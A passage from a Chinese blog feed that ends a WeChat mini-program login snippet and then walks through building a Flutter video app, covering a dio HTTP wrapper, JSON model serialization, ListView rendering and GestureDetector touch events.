     fail: <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>[UserInfor](&#123;&#125;)</span><br><span class="line">          showModal(<span class="string">&#x27;登录错误&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.logged&#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="作品展示"><a href="#作品展示" class="headerlink" title="作品展示"></a>作品展示</h3><img src="/posts/88e91fb0/1.png" class="" width="260" title="点赞页面">
<img src="/posts/88e91fb0/2.png" class="" width="260" title="播放页">
<img src="/posts/88e91fb0/3.png" class="" width="260" title="已点赞页面">
<img src="/posts/88e91fb0/4.png" class="" width="260" title="首页">
<img src="/posts/88e91fb0/5.png" class="" width="260" title="分享页面">
]]></content>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>鹰眼视频 (一)</title>
    <url>/posts/ab4a2db7/</url>
    <content><![CDATA[<h2 id="Flutter-鹰眼视频"><a href="#Flutter-鹰眼视频" class="headerlink" title="Flutter - 鹰眼视频"></a>Flutter - 鹰眼视频</h2><p>鹰眼视频 App 相关技术知识点</p>
<img src="/posts/ab4a2db7/yyspflutterhome.png" class="" title="鹰眼视频">

<ul>
<li>目录结构</li>
<li>页面拆封</li>
<li>封装 dio &lt; Flutter http 插件 &gt;</li>
<li>使用懒加载图片特效</li>
<li>json自动序列化 model 映射</li>
<li>ListView 组件</li>
<li>GestureDetector 手势</li>
<li>路由导航</li>
<li>视频播放</li>
</ul>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lib</span><br><span class="line">    comments    &#x2F;&#x2F; 组件封装</span><br><span class="line">    model       &#x2F;&#x2F; 序列号model</span><br><span class="line">    page        &#x2F;&#x2F; 页面</span><br><span class="line">    serves      &#x2F;&#x2F; http 相关的 目录 </span><br><span class="line">    view        &#x2F;&#x2F; 存放一些 组件组合的 控件</span><br><span class="line">    main.dart   &#x2F;&#x2F; Flutter入口dart文件 </span><br></pre></td></tr></table></figure>

 <a id="more"></a>

<h3 id="页面拆封"><a href="#页面拆封" class="headerlink" title="页面拆封"></a>页面拆封</h3><h4 id="main-dart-入口文件内容"><a href="#main-dart-入口文件内容" class="headerlink" title="main.dart 入口文件内容"></a>main.dart 入口文件内容</h4> <figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/homePage.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flutter 入口main函数</span></span><br><span class="line"><span class="keyword">void</span> main()=&gt;runApp(<span class="keyword">new</span> RootPage());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">      title: <span class="string">&#x27;鹰眼视频&#x27;</span>,</span><br><span class="line">      home: <span class="keyword">new</span> HomePage()</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RootPage组件类是根入口,用于汇集所有的 page页面。同时页面的路由配置就可以放到这个RootPage类中去管理。</p>
<p>导入其他文件时的2中方法，如下。</p>
<blockquote>
<p>import ‘package:yysp/page/homePage.dart’;<br>import ‘./page/homePage.dart’;</p>
</blockquote>
<h4 id="homePage-dart-首页"><a href="#homePage-dart-首页" class="headerlink" title="homePage.dart 首页"></a>homePage.dart 首页</h4><p>该文件存放在 ** /page/ ** 目录下, ** page ** 目录用于管理所有的页面资源。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;鹰眼视频&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                ),</span><br><span class="line">                body: <span class="keyword">new</span> Text(<span class="string">&#x27;我是首页&#x27;</span>),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个最基本的有状态组件,有状态组件可以做交互、让组件可控。如react中的 this.setState()后，组件就会重新绘制。不过Flutter中的修改状态值的方法是 ** setState((){ }) ** ,与React 一样。</p>
<h3 id="封装自己的dio"><a href="#封装自己的dio" class="headerlink" title="封装自己的dio"></a>封装自己的dio</h3><p>Api.dart、httpUtil.dart 文件都存放在 ** /servers/**目录下。</p>
<p>Api.dart 文件内容</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Api</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基础 Url</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">String</span> BaseUrl = <span class="string">&#x27;https://436086407.dmi.net.cn/weapp/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 视频列表</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="built_in">String</span> VideList = <span class="string">&#x27;<span class="subst">$BaseUrl</span>/videolist&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>httpUtil.dart 文件内容</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:dio/dio.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> HttpUtil instance;</span><br><span class="line">  Dio dio;</span><br><span class="line">  Options options;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> HttpUtil getInstance() &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;getInstance&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  HttpUtil() &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dio赋值&#x27;</span>);</span><br><span class="line">    options = Options(</span><br><span class="line">      baseUrl: Api.BaseUrl,</span><br><span class="line">      connectTimeout: <span class="number">10000</span>,</span><br><span class="line">      receiveTimeout: <span class="number">3000</span>,</span><br><span class="line">      headers: &#123;&#125;,</span><br><span class="line">    );</span><br><span class="line">    dio = <span class="keyword">new</span> Dio(options);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span>(url, &#123;data, options, cancelToken&#125;) <span class="keyword">async</span> &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get请求启动! url：<span class="subst">$url</span> ,body: <span class="subst">$data</span>&#x27;</span>);</span><br><span class="line">    Response response;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="keyword">await</span> dio.<span class="keyword">get</span>(</span><br><span class="line">        url,</span><br><span class="line">        data: data,</span><br><span class="line">        cancelToken: cancelToken,</span><br><span class="line">      );</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;get请求成功!response.data：<span class="subst">$&#123;response.data&#125;</span>&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">on</span> DioError <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (CancelToken.isCancel(e)) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;get请求取消! &#x27;</span> + e.message);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;get请求发生错误：<span class="subst">$e</span>&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  post(url, &#123;data, options, cancelToken&#125;) <span class="keyword">async</span> &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;post请求启动! url：<span class="subst">$url</span> ,body: <span class="subst">$data</span>&#x27;</span>);</span><br><span class="line">    Response response;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="keyword">await</span> dio.post(</span><br><span class="line">        url,</span><br><span class="line">        data: data,</span><br><span class="line">        cancelToken: cancelToken,</span><br><span class="line">      );</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;post请求成功!response.data：<span class="subst">$&#123;response.data&#125;</span>&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">on</span> DioError <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (CancelToken.isCancel(e)) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;post请求取消! &#x27;</span> + e.message);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;post请求发生错误：<span class="subst">$e</span>&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里httpUtil类，采用了单列模式。可以想一下 ** java ** 中连接数据库JDBC的情景。</p>
<h3 id="使用懒加载图片特效"><a href="#使用懒加载图片特效" class="headerlink" title="使用懒加载图片特效"></a>使用懒加载图片特效</h3><p>实现这个效果，需要使用第三方的插件。 在 ** pubspec.yaml ** 中添加。</p>
<p>Flutter与node 使用第三方库的区别。</p>
<ul>
<li>node 可以 npm i xxx ,也可以在package 中直接写库名，然后执行 npm i。</li>
<li>flutter 需要手动写到 pubspec.yaml中，在执行 flutter packages get 。</li>
</ul>
<p>加载图片特效插件：transparent_image</p>
<p>封装图片组件，代码示意图</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 图片懒惰加载</span></span><br><span class="line">Widget _buildImage(<span class="built_in">String</span> imgUrl) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FadeInImage.memoryNetwork(</span><br><span class="line">        placeholder: kTransparentImage,</span><br><span class="line">        image: imgUrl,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        fit: BoxFit.fitWidth,</span><br><span class="line">        fadeInDuration: <span class="keyword">const</span> <span class="built_in">Duration</span>(milliseconds: <span class="number">300</span>),</span><br><span class="line">        fadeOutDuration: <span class="keyword">const</span> <span class="built_in">Duration</span>(milliseconds: <span class="number">300</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="json自动序列化-model-映射"><a href="#json自动序列化-model-映射" class="headerlink" title="json自动序列化 model 映射"></a>json自动序列化 model 映射</h3><p>我们在向服务器请求数据后，服务器往往会返回一段json字符串。而我们要想更加灵活的使用数据的话需要把json字符串转化成对象。由于flutter只提供了json to Map。而手写反序列化在大型项目中极不稳定，很容易导致解析失败。所以flutter团队推荐使用json_serializable 自动反序列化。</p>
<p>使用第三方库： json_annotation: ^2.0.0 \ build_runner \ json_serializable</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">dependencies:</span><br><span class="line">  flutter:</span><br><span class="line">    sdk: flutter</span><br><span class="line">  json_annotation: ^<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">dev_dependencies:</span><br><span class="line">  flutter_test:</span><br><span class="line">    sdk: flutter</span><br><span class="line">  build_runner: ^<span class="number">1.1</span><span class="number">.0</span></span><br><span class="line">  json_serializable: ^<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flutter中如何解析json对象"><a href="#flutter中如何解析json对象" class="headerlink" title="flutter中如何解析json对象"></a>flutter中如何解析json对象</h4><p>假如我们的mock数据是如下形式。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;id&quot;</span> : <span class="number">8863</span>,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span> : [ <span class="number">8952</span>, <span class="number">9224</span>, <span class="number">8917</span> ],</span><br><span class="line">    <span class="attr">&quot;score&quot;</span> : <span class="number">111</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么我们需要根据相应的json数据去创建对应的model实体类</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:json_annotation/json_annotation.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">int</span> id;</span><br><span class="line">  <span class="meta">@JsonKey</span>(name: <span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; listData;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">  Data(&#123;<span class="keyword">this</span>.id, <span class="keyword">this</span>.listData, <span class="keyword">this</span>.score&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里使用了 ** @JsonKey(name: ‘list) ** ,原因是，因为我们的json数据中使用了list关键字,所以我们给起个别名listData。并且与Json的list字断映射！</p>
<h4 id="生成Json解析文件"><a href="#生成Json解析文件" class="headerlink" title="生成Json解析文件"></a>生成Json解析文件</h4><p>在这里，我们需要使用 ** build_runner ** 去生成dart代码，** build_runner **是dart团队提供的一个生成dart代码文件的外部包。</p>
<p>当前项目的目录下运行</p>
<blockquote>
<p>flutter packages pub run build_runner build</p>
</blockquote>
<p>运行成功后，就可以在我们的model实体类下面看见一个叫 ** Data.g.dart ** 的文件，内容如下：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GENERATED CODE - DO NOT MODIFY BY HAND</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">part</span> of <span class="string">&#x27;data.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// **************************************************************************</span></span><br><span class="line"><span class="comment">// JsonSerializableGenerator</span></span><br><span class="line"><span class="comment">// **************************************************************************</span></span><br><span class="line"></span><br><span class="line">Data _$DataFromJson(<span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; json) &#123;</span><br><span class="line">  <span class="keyword">return</span> Data(</span><br><span class="line">      id: json[<span class="string">&#x27;id&#x27;</span>] <span class="keyword">as</span> <span class="built_in">int</span>,</span><br><span class="line">      kids: (json[<span class="string">&#x27;kids&#x27;</span>] <span class="keyword">as</span> <span class="built_in">List</span>)?.map((e) =&gt; e <span class="keyword">as</span> <span class="built_in">int</span>)?.toList(),</span><br><span class="line">      score: json[<span class="string">&#x27;score&#x27;</span>] <span class="keyword">as</span> <span class="built_in">int</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; _$DataToJson(Data instance) =&gt; &lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt;&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: instance.id,</span><br><span class="line">      <span class="string">&#x27;kids&#x27;</span>: instance.kids,</span><br><span class="line">      <span class="string">&#x27;score&#x27;</span>: instance.score</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注释 ** GENERATED CODE - DO NOT MODIFY BY HAND” **, 意思是不要手写生成这个文件，使用根据去解决。</p>
</blockquote>
<h4 id="关联实体类文件"><a href="#关联实体类文件" class="headerlink" title="关联实体类文件"></a>关联实体类文件</h4><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:json_annotation/json_annotation.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">part</span> <span class="string">&#x27;data.g.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JsonSerializable</span>()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">int</span> id;</span><br><span class="line">    <span class="meta">@JsonKey</span>(name: <span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; listData;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">int</span> score;</span><br><span class="line"></span><br><span class="line">    Data(&#123;<span class="keyword">this</span>.id, <span class="keyword">this</span>.listData, <span class="keyword">this</span>.score&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">factory</span> Data.fromJson(<span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; json) =&gt; _$DataFromJson(json);</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">dynamic</span>&gt; toJson() =&gt; _$DataToJson(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ListView-组件"><a href="#ListView-组件" class="headerlink" title="ListView 组件"></a>ListView 组件</h3><p>在Flutter中,用ListView来显示列表项,支持垂直和水平方向展示,通过一个属性我们就可以控制其方向，在这里只做大数据的渲染介绍。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/httpUtil.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/model/videos.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line">    HttpUtil httpUtil = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    <span class="built_in">List</span>&lt;<span class="built_in">dynamic</span>&gt; _videosList = <span class="keyword">new</span> <span class="built_in">List</span>(); <span class="comment">// 视频列表数据</span></span><br><span class="line">    <span class="built_in">int</span> _pageNo = <span class="number">0</span>; <span class="comment">// 开始页</span></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;鹰眼视频&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 这是listView 实现 大数据渲染的 方法</span></span><br><span class="line">                body: <span class="keyword">new</span> ListView.builder(</span><br><span class="line">                    itemCount: _videosList.length,</span><br><span class="line">                    itemBuilder: <span class="keyword">this</span>._buildRow,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// listView 子项 itemBuilder build方法 传入2个参数，( context 上下文, position 下标 - 计数器)</span></span><br><span class="line">    Widget _buildRow(BuildContext context, <span class="built_in">int</span> position) &#123;</span><br><span class="line">        <span class="built_in">print</span>(_videosList[position].toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Card(</span><br><span class="line">            margin: EdgeInsets.only(bottom: <span class="number">38.0</span>),</span><br><span class="line">            child: <span class="keyword">new</span> Container(</span><br><span class="line">                height: <span class="number">256.0</span>,</span><br><span class="line">                child: <span class="keyword">this</span>._buildImage(_videosList[position][<span class="string">&#x27;img&#x27;</span>])</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">        _getContent(_pageNo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取网络数据</span></span><br><span class="line">    <span class="keyword">void</span> _getContent(pageNo) <span class="keyword">async</span> &#123;</span><br><span class="line">        <span class="built_in">String</span> url = Api.VideList;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;<span class="string">&#x27;page&#x27;</span>: pageNo&#125;;</span><br><span class="line">        <span class="keyword">var</span> response = <span class="keyword">await</span> HttpUtil().<span class="keyword">get</span>(url, data: data);</span><br><span class="line">        Videos videos = Videos.fromJson(response);</span><br><span class="line">        <span class="keyword">if</span> (videos.code == <span class="number">0</span>) &#123;</span><br><span class="line">            setState(() &#123;</span><br><span class="line">                _videosList.addAll(videos.data.listData);</span><br><span class="line">                _pageNo = pageNo + <span class="number">1</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面介绍了 如何http 获取数据，并且把json数据映射到model实体类。其实listView最主要的就是，做大数据渲染。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ListView 核心</span></span><br><span class="line"><span class="keyword">new</span> ListView.builder(</span><br><span class="line">    itemCount: _videosList.length,</span><br><span class="line">    itemBuilder: <span class="keyword">this</span>._buildRow,</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line">itemCount: 表示列表项的总数。</span><br><span class="line">itemBuilder： 渲染子项的方法，使其list列表中显示不同的组件界面。</span><br></pre></td></tr></table></figure>
<h3 id="GestureDetector-手势"><a href="#GestureDetector-手势" class="headerlink" title="GestureDetector 手势"></a>GestureDetector 手势</h3><p>GestureDetector 手势控件没有图像展示，只是检测用户输入的手势。当用户点击Container时，GestureDetector会调用onTap回调。也可以使用GestureDetector检测各种输入手势，包括点击、拖动和缩放。不过也有许多的控件使用GestureDetector为其他控件提供回调，比如IconButton、RaisedButton和FloatingActionButton控件有onPressed回调，当用户点击控件时触发回调。</p>
<h4 id="手势事件"><a href="#手势事件" class="headerlink" title="手势事件"></a>手势事件</h4><table>
<thead>
<tr>
<th>属性/回调</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>onTapDown</td>
<td>每次用户与屏幕联系时都会触发 OnTapDown</td>
</tr>
<tr>
<td>onTapUp</td>
<td>当用户停止触摸屏幕时，onTapUp 被调用</td>
</tr>
<tr>
<td>onTap</td>
<td>当短暂触摸屏幕时，onTap 被触发</td>
</tr>
<tr>
<td>onTapCancel</td>
<td>当用户触摸屏幕但未完成 Tap 时，将触发此事件</td>
</tr>
<tr>
<td>onDoubleTap</td>
<td>当屏幕被快速连续触摸两次时调用 onDoubleTap</td>
</tr>
<tr>
<td>onLongPress</td>
<td>用户触摸屏幕超过 500毫秒 时，onLongPress 被触发</td>
</tr>
<tr>
<td>onVerticalDragDown</td>
<td>当指针与屏幕接触并开始沿垂直方向移动时，onVerticalDown 被调用</td>
</tr>
<tr>
<td>onVerticalDragStart</td>
<td>当指针 开始 沿垂直方向移动时调用 onVerticalDragStart</td>
</tr>
<tr>
<td>onVerticalDragUpdate</td>
<td>每次指针在屏幕上的位置发生变化时都会调用此方法</td>
</tr>
<tr>
<td>onVerticalDragEnd</td>
<td>当用户停止移动时，拖动被认为是完成的，将调用此事件</td>
</tr>
<tr>
<td>onVerticalDragCancel</td>
<td>当用户突然停止拖动时调用</td>
</tr>
<tr>
<td>onHorizontalDragDown</td>
<td>当用户/指针与屏幕接触并开始水平移动时调用</td>
</tr>
<tr>
<td>onHorizontalDragStart</td>
<td>用户/指针已与屏幕接触并 开始 沿水平方向移动</td>
</tr>
<tr>
<td>onHorizontalDragUpdate</td>
<td>每次指针在水平方向/x轴上的位置发生变化时调用</td>
</tr>
<tr>
<td>onHorizontalDragEnd</td>
<td>在水平拖动结束时，将调用此事件</td>
</tr>
<tr>
<td>onHorizontalDragCancel</td>
<td>当指针未成功触发 onHorizontalDragDown 时调用</td>
</tr>
<tr>
<td>onPanDown</td>
<td>当指针与屏幕接触时调用</td>
</tr>
<tr>
<td>onPanStart</td>
<td>指针事件开始移动时，onPanStart 触发</td>
</tr>
<tr>
<td>onPanUpdate</td>
<td>每次指针改变位置时，调用 onPanUpdate</td>
</tr>
<tr>
<td>onPanEnd</td>
<td>平移完成后，将调用此事件</td>
</tr>
<tr>
<td>onScaleStart</td>
<td>当指针与屏幕接触并建立 1.0 的焦点时，将调用此事件</td>
</tr>
<tr>
<td>onScaleUpdate</td>
<td>与屏幕接触的指针指示了新的焦点</td>
</tr>
<tr>
<td>onScaleEnd</td>
<td>当指针不再与指示手势结束的屏幕接触时调用</td>
</tr>
</tbody></table>
<h4 id="onTap-事咧"><a href="#onTap-事咧" class="headerlink" title="onTap 事咧"></a>onTap 事咧</h4><p>这里以onTap手势事件，为例。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传参数的手势。</span></span><br><span class="line"><span class="keyword">new</span> GestureDetector(</span><br><span class="line">    child:Container(</span><br><span class="line">        width: <span class="built_in">double</span>.infinity,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        child: <span class="keyword">this</span>._buildImage(_videosList[position][<span class="string">&#x27;img&#x27;</span>]), <span class="comment">// 返回的是自定义的图片组件</span></span><br><span class="line">    ),</span><br><span class="line">    onTap: <span class="keyword">this</span>._videoPlayToggle(_videosList[position][<span class="string">&#x27;id&#x27;</span>]), <span class="comment">// 这里是点击图片触发的事件，并且传入一个参数</span></span><br><span class="line">),</span><br><span class="line"></span><br><span class="line"><span class="built_in">Function</span> _videoPlayToggle(id) &#123;</span><br><span class="line">    <span class="keyword">return</span> () =&gt; parint(<span class="string">&#x27;我是onTab事件，参数 <span class="subst">$id</span>&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

